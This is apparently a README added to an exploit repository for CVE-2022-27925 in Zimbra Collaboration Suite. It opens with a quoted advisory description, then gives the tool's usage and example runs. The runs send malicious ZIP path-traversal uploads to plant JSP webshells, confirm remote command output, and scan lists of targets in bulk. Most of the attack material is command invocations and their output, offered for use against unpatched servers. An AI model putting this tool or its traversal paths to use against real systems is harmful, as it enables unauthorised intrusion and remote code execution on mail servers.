@@ -1,0 +1,113 @@
+# CVE-2022-27925
+
+# Description
+On May 10, 2022, Zimbra released versions 9.0.0 patch 24 and 8.8.15 patch 31 to address multiple vulnerabilities in Zimbra Collaboration Suite, including CVE-2022-27924 (which we wrote about previously) and CVE-2022-27925.
+
+Originally, Zimbra called CVE-2022-27925 an authenticated path-traversal attack, where an administrative user could write files into any directory on the filesystem as the Zimbra account. Because it was originally thought to be an administrator-only attack, NVD assigned it a CVSS base score of 7.8. Later, Volexity noticed that attackers exploiting this vulnerability had found a way to bypass the administrative requirements, and wrote about it on August 10, 2022. This new authentication bypass got a new identifier – CVE-2022-37042.
+
+By combining the original path-traversal vulnerability and new authentication bypass, attackers can remotely compromise a Zimbra Collaboration Suite system via the administrator port (by default, 7071) anonymously. Combined with a currently unpatched privilege escalation vulnerability that we recently wrote about and wrote an exploit for, these three vulnerabilities lead to remote command execution as the root user on unpatched systems.
+
+Although the public advisories don’t mention it, according to our analysis, Zimbra Collaboration Suite Network Edition (the paid edition) is vulnerable, and the Open Source Edition (free) is not (since it does not have the vulnerable mboximport endpoint). Vulnerable versions are:
+
+    Zimbra Collaboration Suite Network Edition 9.0.0 Patch 23 (and earlier)
+    Zimbra Collaboration Suite Network Edition 8.8.15 Patch 30 (and earlier)
+
+These vulnerablities (and others in Zimbra) are being targeted for widespread exploitation in the wild, and should therefore be patched or taken offline as soon as possible. If you suspect you’ve been compromised, Zimbra provides steps to rebuild your Zimbra Collaboration Suite server from scratch on the latest patch without losing data.
+
+Source: https://attackerkb.com/topics/dSu4KGZiFd/cve-2022-27925/rapid7-analysis
+
+## Usage
+```
+ _____   _           __
+/__  /  (_)___ ___  / /_  _________ _
+  / /  / / __ `__ \/ __ \/ ___/ __ `/
+ / /__/ / / / / / / /_/ / /  / /_/ /
+/____/_/_/ /_/ /_/_.___/_/   \__,_/
+                    CVE-2022-27925
+
+usage: exploit.py [-h] [-t TARGET] [-l LIST]
+
+options:
+  -h, --help            show this help message and exit
+  -t TARGET, --target TARGET
+                        URl with protocol HTTPS
+  -l LIST, --list LIST  List of targets
+```
+
+# Example run
+
+```
+root@root# python exploit.py -t zimbra.example.com
+_____   _           __
+/__  /  (_)___ ___  / /_  _________ _
+  / /  / / __ `__ \/ __ \/ ___/ __ `/
+ / /__/ / / / / / / /_/ / /  / /_/ /
+/____/_/_/ /_/ /_/_.___/_/   \__,_/
+                    CVE-2022-27925 Sanan Qasim
+
+[!] Testing URL: https://zimbra.example.com
+[!] Target is up!
+[!] Creating malicious ZIP path: ../../../../mailboxd/webapps/zimbraAdmin/
+[!] Exploiting!
+[!] Testing webshell
+[+] Webshell works!!
+[+] WebShell location: https://zimbra.example.com/zimbraAdmin/BQOQBN.jsp
+[+] Uname -a output: Linux zimbra.docker 3.10.0-1127.8.2.el7.x86_64 #1 SMP Thu May 7 19:30:37 EDT 2020 x86_64 x86_64 x86_64 GNU/Linux
+
+root@root# python exploit.py -l targets.txt
+
+ _____   _           __
+/__  /  (_)___ ___  / /_  _________ _
+  / /  / / __ `__ \/ __ \/ ___/ __ `/
+ / /__/ / / / / / / /_/ / /  / /_/ /
+/____/_/_/ /_/ /_/_.___/_/   \__,_/
+                    CVE-2022-27925 sanan Qasim
+
+[!] Testing URL: https://patched.example.com
+[!] Target is up!
+[!] Creating malicious ZIP path: ../../../../mailboxd/webapps/zimbraAdmin/
+[!] Exploiting!
+[!] Testing webshell
+[-] Target not vulnerable
+[!] Creating malicious ZIP path: ../../../../jetty_base/webapps/zimbraAdmin/
+[!] Exploiting!
+[!] Testing webshell
+[-] Target not vulnerable
+[!] Creating malicious ZIP path: ../../../../jetty/webapps/zimbraAdmin/
+[!] Exploiting!
+[!] Testing webshell
+[-] Target not vulnerable
+[!] Testing URL: https://zimbra.example.com
+[!] Target is up!
+[!] Creating malicious ZIP path: ../../../../mailboxd/webapps/zimbraAdmin/
+[!] Exploiting!
+[!] Testing webshell
+[+] Webshell works!!
+[+] WebShell location: https://zimbra.example.com/zimbraAdmin/7RRT4G.jsp
+[+] Uname -a output: Linux zimbra.docker 3.10.0-1127.8.2.el7.x86_64 #1 SMP Thu May 7 19:30:37 EDT 2020 x86_64 x86_64 x86_64 GNU/Linux
+[!] Creating malicious ZIP path: ../../../../jetty_base/webapps/zimbraAdmin/
+[!] Exploiting!
+[!] Testing webshell
+[+] Webshell works!!
+[+] WebShell location: https://zimbra.example.com/zimbraAdmin/7RRT4G.jsp
+[+] Uname -a output: Linux zimbra.docker 3.10.0-1127.8.2.el7.x86_64 #1 SMP Thu May 7 19:30:37 EDT 2020 x86_64 x86_64 x86_64 GNU/Linux
+[!] Creating malicious ZIP path: ../../../../jetty/webapps/zimbraAdmin/
+[!] Exploiting!
+[!] Testing webshell
+[+] Webshell works!!
+[+] WebShell location: https://zimbra.example.com/zimbraAdmin/7RRT4G.jsp
+[+] Uname -a output: Linux zimbra.docker 3.10.0-1127.8.2.el7.x86_64 #1 SMP Thu May 7 19:30:37 EDT 2020 x86_64 x86_64 x86_64 GNU/Linux
+[!] Testing URL: https://patched.example.com
+[!] Target is up!
+[!] Creating malicious ZIP path: ../../../../mailboxd/webapps/zimbraAdmin/
+[!] Exploiting!
+[!] Testing webshell
+[-] Target not vulnerable
+[!] Creating malicious ZIP path: ../../../../jetty_base/webapps/zimbraAdmin/
+[!] Exploiting!
+[!] Testing webshell
+[-] Target not vulnerable
+[!] Creating malicious ZIP path: ../../../../jetty/webapps/zimbraAdmin/
+[!] Exploiting!
+[!] Testing webshell
+[-] Target not vulnerable
